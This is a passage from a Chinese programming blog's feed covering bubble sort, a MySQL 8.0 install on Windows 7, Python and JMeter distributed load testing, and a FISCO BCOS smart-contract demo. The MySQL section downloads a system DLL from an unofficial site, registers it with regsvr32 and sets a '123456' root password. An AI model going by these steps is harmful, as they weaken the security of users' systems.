<li>冒泡排序法是通过相邻元素之间的比较与交换，使值较小的元素逐步从后面移到前面，值较大的元素从前面移到后面，就像水底的气泡一样向上冒，故称这种排序方法为冒泡排序法。</li>
</ul>
<h2 id="冒泡算法步骤"><a href="#冒泡算法步骤" class="headerlink" title="冒泡算法步骤"></a>冒泡算法步骤</h2><ul>
<li>先将序列中第 <code>1</code> 个元素与第 <code>2</code> 个元素进行比较，若前者大于后者，则两者交换位置，否则不交换；</li>
<li>然后将第 <code>2</code> 个元素与第 <code>3</code> 个元素比较，若前者大于后者，则两者交换位置，否则不交换；</li>
<li>依次类推，直到第 <code>n - 1</code> 个元素与第 <code>n</code> 个元素比较（或交换）为止。经过如此一趟排序，使得 <code>n</code> 个元素中值最大元素被安置在序列的第 <code>n</code> 个位置上。</li>
</ul>
<h2 id="冒泡排序动画演示"><a href="#冒泡排序动画演示" class="headerlink" title="冒泡排序动画演示"></a>冒泡排序动画演示</h2><p><img src="/aposts/14e6f1eb/bubbleSort.gif" alt="bubbleSort"></p>
<h2 id="冒泡排序代码实现"><a href="#冒泡排序代码实现" class="headerlink" title="冒泡排序代码实现"></a>冒泡排序代码实现</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bubbleSort</span>(<span class="params">self, arr</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arr)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arr) - i - <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> arr[j] &gt; arr[j + <span class="number">1</span>]:</span><br><span class="line">                    arr[j], arr[j + <span class="number">1</span>] = arr[j + <span class="number">1</span>], arr[j]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> arr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sortArray</span>(<span class="params">self, nums</span>):</span><br><span class="line">        <span class="keyword">return</span> self.bubbleSort(nums)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   st = Solution().sortArray([<span class="number">10</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">8</span>])</span><br><span class="line">   <span class="built_in">print</span>(st)</span><br><span class="line">    </span><br><span class="line"> [<span class="number">2</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="移动零"><a href="#移动零" class="headerlink" title="移动零"></a>移动零</h2><ul>
<li>原题来自于<a href="https://leetcode-cn.com/problems/move-zeroes/">这里</a></li>
<li>这是对冒泡算法的运用</li>
</ul>
<h3 id="题目大意"><a href="#题目大意" class="headerlink" title="题目大意"></a>题目大意</h3><p>给你一个数组，将所有 0 移动到末尾，并保持原有的非 0 数字的相对顺序。要求只能在原数组上进行操作。</p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ul>
<li><p>使用两个指针 left，right。left 指向处理好的非 0 数字数组的尾部，right 指针指向当前待处理元素。</p>
</li>
<li><p>不断向右移动 right 指针，每次移动到非零数，则将左右指针对应的数交换，交换同时将 left 右移。</p>
</li>
<li><p>此时，left 指针左边均为处理好的非零数，而从 left 指针指向的位置开始， right 指针左边都为 0。</p>
</li>
<li><p>遍历结束之后，则所有 0 都移动到了右侧，且保持了非零数的相对位置。</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def moveZeroes(self, nums):</span><br><span class="line">        left = 0</span><br><span class="line">        right = 0</span><br><span class="line">        while right &lt; len(nums):</span><br><span class="line">        # 不断向右移动 right 指针</span><br><span class="line">            if nums[right] != 0:</span><br><span class="line">            # 每次移动到非零数，则将左右指针对应的数交换，</span><br><span class="line">                nums[left], nums[right] = nums[right], nums[left]</span><br><span class="line">                # 交换同时将 left 右移</span><br><span class="line">                left += 1</span><br><span class="line">            # 不断向右移动 right 指针</span><br><span class="line">            right += 1</span><br><span class="line">        print(nums)</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">   st = Solution().moveZeroes([1,1,0,1,0,1])</span><br><span class="line"></span><br><span class="line">   [1, 1, 1, 1, 0, 0]</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>leetcode-数组</tag>
      </tags>
  </entry>
  <entry>
    <title>win7 mysql安装详解</title>
    <url>/aposts/3fcd402/</url>
    <content><![CDATA[<h2 id="mysql准备"><a href="#mysql准备" class="headerlink" title="mysql准备"></a>mysql准备</h2><ul>
<li><p><a href="https://dev.mysql.com/downloads/mysql/">官网</a>下载对应的zip包，我选择的(mysql-8.0.22-winx64.zip)</p>
</li>
<li><p>在mysql-8.0.22-winx64文件夹下面新建一个<code>my.ini</code>文件和一个<code>data</code>文件夹</p>
</li>
<li><p>my.ini中的内容</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">my.ini内容：</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>mysqld<span class="punctuation">]</span></span><br><span class="line"># 设置<span class="number">3306</span>端口</span><br><span class="line">port=<span class="number">3306</span></span><br><span class="line"># 设置mysql的安装目录</span><br><span class="line">basedir=E<span class="punctuation">:</span>\\app\\mysql<span class="number">-8.0</span><span class="number">.22</span>-winx64</span><br><span class="line"># 设置mysql数据库的数据的存放目录</span><br><span class="line">datadir=E<span class="punctuation">:</span>\\app\\mysql<span class="number">-8.0</span><span class="number">.22</span>-winx64\\data</span><br><span class="line"># 允许最大连接数</span><br><span class="line">max_connections=<span class="number">200</span></span><br><span class="line"># 允许连接失败的次数。这是为了防止有人从该主机试图攻击数据库系统</span><br><span class="line">max_connect_errors=<span class="number">10</span></span><br><span class="line"># 服务端使用的字符集默认为UTF8</span><br><span class="line">character-set-server=utf8</span><br><span class="line"># 创建新表时将使用的默认存储引擎</span><br><span class="line">default-storage-engine=INNODB</span><br><span class="line"><span class="punctuation">[</span>mysql<span class="punctuation">]</span></span><br><span class="line"># 设置mysql客户端默认字符集</span><br><span class="line">default-character-set=utf8</span><br><span class="line"># 注意这里的配置，ONLY_FULL_GROUP_BY的报错问题</span><br><span class="line">sql_mode=&#x27;STRICT_TRANS_TABLES<span class="punctuation">,</span>NO_ENGINE_SUBSTITUTION&#x27;</span><br><span class="line"><span class="punctuation">[</span>client<span class="punctuation">]</span></span><br><span class="line"># 设置mysql客户端连接服务端时默认使用的端口</span><br><span class="line">port=<span class="number">3306</span></span><br><span class="line">default-character-set=utf8</span><br></pre></td></tr></table></figure>
<blockquote>
<p>5.7后的版本，使用了group by分组后，select后的字段必须也要是分组的，不然报错ONLY_FULL_GROUP_BY，因此需要设置sql_mode</p>
</blockquote>
</li>
<li><p>我的电脑设置环境变量</p>
<ul>
<li>MYSQL_HOME&#x3D;e:\app\mysql-8.0.22-winx64</li>
<li>在path中添加%MYSQL_HOME%\bin</li>
</ul>
</li>
</ul>
<h2 id="mysql安装"><a href="#mysql安装" class="headerlink" title="mysql安装"></a>mysql安装</h2><ul>
<li>已管理员身份打开cmd,输入<code>mysqld --initialize --user=mysql --console</code>发现弹出没有<code>vcruntime140_1.dll</code>文件<ul>
<li>找到<a href="https://cn.dll-files.com/vcruntime140_1.dll.html">对应网站</a>下载此dll</li>
</ul>
</li>
<li><code>vcruntime140_1.dll</code>文件放到<code>C:\Windows\System32</code> 和 <code>C:\Windows\SysWOW64</code>下</li>
<li>运行下面的bat文件，进行注册<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@echo 开始注册</span><br><span class="line">copy vcruntime140_1.dll %windir%\system32\</span><br><span class="line">regsvr32 %windir%\system32\vcruntime140_1.dll /s</span><br><span class="line">@echo system32 vcruntime140_1.dll注册成功</span><br><span class="line"></span><br><span class="line">copy vcruntime140_1.dll %windir%\SysWOW64\</span><br><span class="line">regsvr32 %windir%\system32\vcruntime140_1.dll /s</span><br><span class="line">@echo SysWOW64 vcruntime140_1.dll注册成功</span><br><span class="line">@pause</span><br></pre></td></tr></table></figure></li>
<li>初始化数据库<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\&gt;mysqld --initialize --user=mysql --console</span><br><span class="line">2020-11-28T03:32:30.871296Z 0 [System] [MY-013169] [Server] E:\app\mysql-8.0.22-</span><br><span class="line">winx64\bin\mysqld.exe (mysqld 8.0.22) initializing of server in progress as proc</span><br><span class="line">ess 6964</span><br><span class="line">2020-11-28T03:32:30.873294Z 0 [Warning] [MY-013242] [Server] --character-set-ser</span><br><span class="line">ver: &#x27;utf8&#x27; is currently an alias for the character set UTF8MB3, but will be an</span><br><span class="line">alias for UTF8MB4 in a future release. Please consider using UTF8MB4 in order to</span><br><span class="line"> be unambiguous.</span><br><span class="line">2020-11-28T03:32:30.884295Z 1 [System] [MY-013576] [InnoDB] InnoDB initializatio</span><br><span class="line">n has started.</span><br><span class="line">2020-11-28T03:32:33.331435Z 1 [System] [MY-013577] [InnoDB] InnoDB initializatio</span><br><span class="line">n has ended.</span><br><span class="line">2020-11-28T03:32:35.760574Z 6 [Note] [MY-010454] [Server] A temporary password i</span><br><span class="line">s generated for root@localhost: JoyfjqHL5)SO</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><code>JoyfjqHL5)SO</code>这个就是得到的数据库密码</li>
<li>输入命令安装mysql<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\&gt;mysqld install</span><br><span class="line">Service successfully installed.</span><br></pre></td></tr></table></figure></li>
<li>启动mysql服务<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\&gt;net start mysql</span><br><span class="line">MySQL 服务正在启动 .</span><br><span class="line">MySQL 服务已经启动成功</span><br></pre></td></tr></table></figure></li>
<li>登陆mysql,粘贴刚刚生成的密码<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\&gt;mysql -u root -p</span><br></pre></td></tr></table></figure></li>
<li>登陆成功后修改密码<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;123456&#x27;;</span><br></pre></td></tr></table></figure></li>
<li>刷新<code>FLUSH PRIVILEGES;</code></li>
</ul>
<h2 id="mysql连接"><a href="#mysql连接" class="headerlink" title="mysql连接"></a>mysql连接</h2><ul>
<li>我这里使用<a href="https://www.heidisql.com/download.php">heidisql</a></li>
<li>新建会话，输入密码，打开下面页面就说明已经成功连接数据库<br><img src="/aposts/3fcd402/image-20230612102438254.png" alt="image-20230612102438254"></li>
</ul>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>分布式压力测试</title>
    <url>/aposts/f397e561/</url>
    <content><![CDATA[<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul>
<li>主要用途是想用多机压测服务器端</li>
<li>可以组合任何平台，任意语言，任意压测方法，任意电脑等对服务器进行压测</li>
</ul>
<h2 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h2><ul>
<li>开启一个webserver记录客户端压测情况</li>
<li>然后可以运行多个电脑启动多个客户端，压测电脑在同一个内网，也可配置成外网apache。</li>
</ul>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><ul>
<li>配置信息</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__author__ = &quot;shikun&quot;</span><br><span class="line">class Const(object):</span><br><span class="line">    log = &quot;D:/app/Apache2.2/htdocs/client.log&quot; # apache 的log路径</span><br><span class="line">    APAHEC_IP = &quot;192.168.1.38&quot; # 本机ip</span><br><span class="line">    PORT_NUMBER = 8088 # 端口号</span><br></pre></td></tr></table></figure>

<ul>
<li>web server.py</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from http.server import BaseHTTPRequestHandler,HTTPServer</span><br><span class="line">import urllib.parse</span><br><span class="line">from common import operateFile</span><br><span class="line">from common.customConst import Const</span><br><span class="line">class myHandler(BaseHTTPRequestHandler):</span><br><span class="line">  # Handler for the GET requests</span><br><span class="line">    def do_GET(self):</span><br><span class="line">        print(&#x27;Get request received&#x27;)</span><br><span class="line">        req = urllib.parse.unquote(self.path)</span><br><span class="line">        result = urllib.parse.parse_qs(req[2:]) # 得到请求参数</span><br><span class="line">        self.send_response(200)</span><br><span class="line">        self.send_header(&#x27;Content-type&#x27;,&#x27;text/html&#x27;)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        # Send the html message</span><br><span class="line">        self.wfile.write(b&quot;ok!&quot;) #发送信息给客户端</span><br><span class="line">        operateFile.write_txt(line=result[&quot;msg&quot;][0], f_path=Const.log) # 记录各个客户端发来的信息</span><br><span class="line">try:</span><br><span class="line">  server = HTTPServer((Const.APAHEC_IP, Const.PORT_NUMBER), myHandler)</span><br><span class="line">  print (&#x27;Started httpserver on port &#x27; , Const.PORT_NUMBER)</span><br><span class="line">  server.serve_forever()</span><br><span class="line">except KeyboardInterrupt:</span><br><span class="line">  print (&#x27;^C received, shutting down the web server&#x27;)</span><br><span class="line">  server.socket.close()</span><br></pre></td></tr></table></figure>

<ul>
<li>client.py</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from multiprocessing import Process</span><br><span class="line">from gevent import monkey; monkey.patch_all()</span><br><span class="line">import gevent</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">from common.customConst import Const</span><br><span class="line">url = &quot;http://rap.taobao.org/mockjsdata/10296/getUserInfo?id=2&quot;</span><br><span class="line">num = 10</span><br><span class="line">result = &#123;&quot;success&quot;: 0, &quot;computer&quot;: &quot;压测客户端1&quot;, &quot;cpu&quot;: 4, &quot;men&quot;: 4, sum: 10&#125; # 客户端信息</span><br><span class="line"></span><br><span class="line">class Producer(object):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    协程发请求</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    def __init__(self):</span><br><span class="line">       self._rungevent()</span><br><span class="line">       self.h = 0</span><br><span class="line">    def _rungevent(self):</span><br><span class="line">        jobs = []</span><br><span class="line">        for i in range(num): #windows下有端口限制</span><br><span class="line">            jobs.append(gevent.spawn(self.produce))</span><br><span class="line">        gevent.joinall(jobs)</span><br><span class="line">        requests.get(&quot;http://&quot;+Const.APAHEC_IP+&quot;:&quot;+ str(Const.PORT_NUMBER)+&quot;/?msg=&quot;+str(result)) # 发送客户端的请求情况</span><br><span class="line">    def produce(self):</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        if r.status_code == 200:</span><br><span class="line">            r.encoding = &#x27;UTF-8&#x27;</span><br><span class="line">            if json.loads(r.text)[&quot;code&quot;] == 0:</span><br><span class="line">                result[&quot;success&quot;] += 1</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;失败咯&quot;)</span><br><span class="line">def main():</span><br><span class="line">    p = Process(target=Producer, args=())  # 一个进程启动协程</span><br><span class="line">    p.start()</span><br><span class="line"></span><br><span class="line">    # p1 = Process(target = Producer, args=())</span><br><span class="line">    # p1.start()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<ul>
<li>压测端可以用其他语言，其他方法如，多进程+线程，异步等</li>
</ul>
<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="/aposts/f397e561/code.png" alt="Paste_Image.png"></p>
<h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><ul>
<li>这样算不算分布式压力测试，如果哪里有错误，欢迎指正。</li>
<li>服务器监控，现在做的比较简单.直接用命名即可。也可以看此篇的<a href="https://testerhome.com/topics/5413">压测统计思路</a></li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>分布式压测</title>
    <url>/aposts/d312defe/</url>
    <content><![CDATA[<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul>
<li>本次实践是基于win虚拟机分布式压测</li>
<li>被压测网站是我自己搭建的jform论坛</li>
</ul>
<h2 id="为什么要压测"><a href="#为什么要压测" class="headerlink" title="为什么要压测"></a>为什么要压测</h2><ul>
<li>需要使用jmeter模拟大并发的情况时，单台压测机不能满足需求，可进行分布式压测。</li>
<li>简单来说就是，多台机器同时安装jmeter，选择一台机器作为调度机，其他作为压力机。进行相应的配置后，就可以用调度机操控压力机发起请求。</li>
</ul>
<h2 id="安装虚拟机"><a href="#安装虚拟机" class="headerlink" title="安装虚拟机"></a>安装虚拟机</h2><ul>
<li><p>官方下载工具</p>
<p><img src="/aposts/d312defe/image-20211029180146221.png" alt="image-20211029180146221"></p>
</li>
<li><p>打开后下载ios文件到本地</p>
</li>
</ul>
<h3 id="安装过程报错"><a href="#安装过程报错" class="headerlink" title="安装过程报错"></a>安装过程报错</h3><ul>
<li>出现一个类似错误</li>
</ul>
<p><img src="/aposts/d312defe/image-20211029180545713.png" alt="image-20211029180545713"></p>
<ul>
<li>解决办法是禁用Hyper-V，以管理员权限打开 CMD 或 Windows PowerShell ，输入如下命令，然后重启电脑</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bcdedit /set hypervisorlaunchtype off</span><br></pre></td></tr></table></figure>

<h3 id="网络设置"><a href="#网络设置" class="headerlink" title="网络设置"></a>网络设置</h3><ul>
<li>再虚拟机可以ping通主机的ip，再主机却无法ping通虚拟机ip</li>
<li>经过排查，发现虚拟机ip和主机ip的前面三个网段对不上，VirtualBox设置下虚拟机的网络方式为桥接网卡，就可以了</li>
</ul>
<p><img src="/aposts/d312defe/image-20211029163300356.png" alt="image-20211029163300356"></p>
<h2 id="压力机（master控制机）"><a href="#压力机（master控制机）" class="headerlink" title="压力机（master控制机）"></a>压力机（master控制机）</h2><ul>
<li>我装好的win10虚拟机</li>
<li>执行当前压力机下jmeter安装包bin目录下的jmeter-server的批处理文件，此时该机器上启动一个java进程，并随机分配端口，监听来自调度机的请求。</li>
<li>配置固定端口：打开bin目录下的<code>jmeter.properties</code>文件，更改<code>server_port</code>、<code>server.rmi.localport</code>的端口为要配置的端口。</li>
</ul>
<p><img src="/aposts/d312defe/image-20211029173427158.png" alt="image-20211029173427158"></p>
<ul>
<li><p>第一个ip为本机ip，也可以作为负载机使用</p>
</li>
<li><p>把下面的选项打开设置为true</p>
<p><img src="/aposts/d312defe/image-20211029173713156.png" alt="image-20211029173713156"></p>
</li>
</ul>
<h2 id="调度机（slave负载机）"><a href="#调度机（slave负载机）" class="headerlink" title="调度机（slave负载机）"></a>调度机（slave负载机）</h2><ul>
<li>真实机器</li>
<li>打开jmeter安装包bin目录下的<code>jmeter.properties</code>文件，更改<code>remote_hosts</code>为压力机本机ip及执行jmeter-server后启动的端口。</li>
</ul>
<p><img src="/aposts/d312defe/image-20211029173856668.png" alt="image-20211029173856668"></p>
<ul>
<li>把下面的选项打开设置为true，和master控制机一样</li>
</ul>
<p><img src="/aposts/d312defe/image-20211029173713156.png" alt="image-20211029173713156"></p>
<h2 id="keystore配置"><a href="#keystore配置" class="headerlink" title="keystore配置"></a>keystore配置</h2><ul>
<li><p>这样一来算是配置完成了接下来因为jmeter4.0版本及以上时，为了安全 分布式压测需要一个密匙才能正常实现 打开控制机的bin目录运行create-rmi-keystore.bat，用notepad++打开文件 复制这个命令，使用管理员运行</p>
<p><img src="/aposts/d312defe/image-20211029174237855.png" alt="image-20211029174237855"></p>
</li>
<li><p>执行完后，会出现一个rmi_keystore.jks文件，把这个文件放到master和slave中的jmeter&#x2F;bin目录中</p>
</li>
</ul>
<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><ul>
<li>运行控制机jmeter.bat  </li>
<li>运行负载机jmeter-server.bat</li>
</ul>
<p><img src="/aposts/d312defe/image-20211029174523893.png" alt="image-20211029174523893"></p>
<ul>
<li>控制机jmeter.bat  ，打开脚本，运行中看到了两个远程启动的地址，点击运行中的远程启动所有，就能看到jmeter-server.bat中日志出现（图片如上）starting（开始发请求）和finished（发送请求结束），<strong>但是我这里的虚拟机一直只有starting的日志，没有finished的日志，造成监控到的请求没有成功，可能是我的笔记本配置太差引起的，后续有条件用真机测试</strong></li>
</ul>
<p><img src="/aposts/d312defe/image-20211029174949327.png" alt="image-20211029174949327"></p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
<li><p>参考<a href="https://www.cnblogs.com/dcszhangsir/p/13463299.html">jmeter分布式压测</a></p>
</li>
<li><p>本机虚拟机一直无法从 starting 转变成 finished没有解决，这里有<a href="http://testerhome.com/topics/20532">相同问题</a>没有解决</p>
</li>
</ul>
]]></content>
      <categories>
        <category>jmeter</category>
      </categories>
      <tags>
        <tag>jmeter</tag>
        <tag>性能测试</tag>
      </tags>
  </entry>
  <entry>
    <title>基于pythonsdk操作fisco-bcos</title>
    <url>/aposts/f7cb02d3/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>FISCO BCOS是由国内企业主导研发、对外开源、安全可控的企业级金融联盟链底层平台，由金链盟开源工作组协作打造，并于2017年正式对外开源</li>
<li>因为需要使用python sdk来操作FISCO BCOS，官方只支持FISCO BCOS2.0</li>
</ul>
<h2 id="概念介绍"><a href="#概念介绍" class="headerlink" title="概念介绍"></a>概念介绍</h2><ul>
<li>智能合约：可以理解为逻辑代码，比如此次实例中我的智能合约代码就是一个sol文件中</li>
<li>区块链网络：智能合约的代码若要运行，就要放在区块链网络上执行</li>
</ul>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="区块链网络"><a href="#区块链网络" class="headerlink" title="区块链网络"></a>区块链网络</h3><ul>
<li><p>云服务器搭建成功后，发现无法外网访问，看<a href="https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/manual/configuration.html#rpc">这里的文档</a>说明云主机的公网IP均为虚拟IP造成的</p>
</li>
<li><p>也就是区块链的服务端，可以参考<a href="https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/installation.html">这里</a></p>
</li>
<li><p>不启用国密</p>
</li>
</ul>
<h3 id="Python-SDK"><a href="#Python-SDK" class="headerlink" title="Python SDK"></a>Python SDK</h3><ul>
<li><p>主要用来操作FISCO BCOS搭建的区块链网络</p>
</li>
<li><p>环境搭建参考<a href="https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/sdk/python_sdk/index.html">这里</a></p>
</li>
<li><p>我用的win10，使用的python版本为3.7.9，没有使用虚拟环境</p>
</li>
<li><p>没有安装Microsoft Visual C++ 14.0 </p>
</li>
<li><p>client_config.py 为配置文件：</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">channel_host = &quot;XXXXXX.121.XXX&quot;  # 填入channel通信ip</span><br><span class="line">channel_port = 20200  # 节点的channel 端口</span><br></pre></td></tr></table></figure>

<ul>
<li>把区块链网络层那边产生的证书文件放在bin目录下，一般为：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">channel_ca = &quot;bin/ca.crt&quot;</span><br><span class="line">channel_ca = &quot;bin/ca.crt&quot; </span><br></pre></td></tr></table></figure>

<h2 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h2><ul>
<li>合约文件一般放在contracts目录中，如<code>contracts\helloword.sol</code></li>
<li>合约代码采用的<a href="https://www.w3cschool.cn/solidity/">solidity</a>的语法</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">contract HelloWorld&#123;</span><br><span class="line">    string name;</span><br><span class="line">    event onset(string newname);</span><br><span class="line">    constructor() public&#123;</span><br><span class="line">       name = &quot;Hello, World!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get() constant public returns(string)&#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function set(string n) public&#123;</span><br><span class="line">	emit onset(n);</span><br><span class="line">    	name = n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>编写部署合约文件，调用合约函数等</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> client.contractnote <span class="keyword">import</span> ContractNote</span><br><span class="line"><span class="keyword">from</span> client.bcosclient <span class="keyword">import</span> BcosClient</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> client.datatype_parser <span class="keyword">import</span> DatatypeParser</span><br><span class="line"><span class="keyword">from</span> client.common.compiler <span class="keyword">import</span> Compiler</span><br><span class="line"><span class="keyword">from</span> client_config <span class="keyword">import</span> client_config</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从文件加载abi定义</span></span><br><span class="line"></span><br><span class="line">PATH = <span class="keyword">lambda</span> p: os.path.abspath(</span><br><span class="line">    os.path.join(os.path.dirname(__file__), p)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">demo_config = client_config</span><br><span class="line">_sol = PATH(<span class="string">&quot;./contracts/HelloWord.sol&quot;</span>)  <span class="comment"># 合约文件</span></span><br><span class="line">_api = PATH(<span class="string">&quot;./contracts/HelloWord.abi&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.isfile(demo_config.solc_path) <span class="keyword">or</span> os.path.isfile(demo_config.solcjs_path):</span><br><span class="line">    Compiler.compile_file(_sol)</span><br><span class="line"><span class="comment">#     Compiler.compile_file(SimpleInfo_sol)</span></span><br><span class="line">_<span class="built_in">bin</span> = PATH(<span class="string">&quot;./contracts/HelloWord.bin&quot;</span>)</span><br><span class="line">abi_file = _api</span><br><span class="line">data_parser = DatatypeParser()</span><br><span class="line">data_parser.load_abi_file(abi_file)</span><br><span class="line">contract_abi = data_parser.contract_abi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deploy</span>():</span><br><span class="line">    client = BcosClient()</span><br><span class="line">    <span class="built_in">print</span>(client.getinfo())</span><br><span class="line">    <span class="comment"># 部署合约</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&gt;&gt;Deploy:----------------------------------------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(_<span class="built_in">bin</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> load_f:</span><br><span class="line">        contract_bin = load_f.read()</span><br><span class="line">        load_f.close()</span><br><span class="line">    result = client.deploy(contract_bin)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;deploy&quot;</span>, result)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;new address : &quot;</span>, result[<span class="string">&quot;contractAddress&quot;</span>])</span><br><span class="line">    contract_name = os.path.splitext(os.path.basename(abi_file))[<span class="number">0</span>]</span><br><span class="line">    memo = <span class="string">&quot;tx:&quot;</span> + result[<span class="string">&quot;transactionHash&quot;</span>]</span><br><span class="line">    <span class="comment"># 把部署结果存入文件备查</span></span><br><span class="line">    ContractNote.save_address_to_contract_note(<span class="string">&quot;demo&quot;</span>, contract_name,</span><br><span class="line">                                               result[<span class="string">&quot;contractAddress&quot;</span>])</span><br><span class="line">    client.finish()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call</span>():</span><br><span class="line">    client = BcosClient()</span><br><span class="line">    <span class="comment"># stat = StatTool.begin()</span></span><br><span class="line">    <span class="comment"># 调用一下call，获取数据</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&gt;&gt;Call:------------------------------------------------------------------------&quot;</span>)</span><br><span class="line">    to_address = <span class="string">&quot;xxxxxxxx&quot;</span></span><br><span class="line"></span><br><span class="line">   client.sendRawTransactionGetReceipt(to_address,contract_abi,<span class="string">&quot;set&quot;</span>,[<span class="string">&quot;hi&quot;</span>])</span><br><span class="line"></span><br><span class="line">    data = client.call(to_address, contract_abi, <span class="string">&quot;get&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    client.finish()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    deploy()</span><br><span class="line">    <span class="comment"># call()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><code>client.deploy</code> 部署合约</li>
<li><code>sendRawTransactionGetReceipt</code> 执行修改操作</li>
<li><code>call</code> 执行查询操作</li>
</ul>
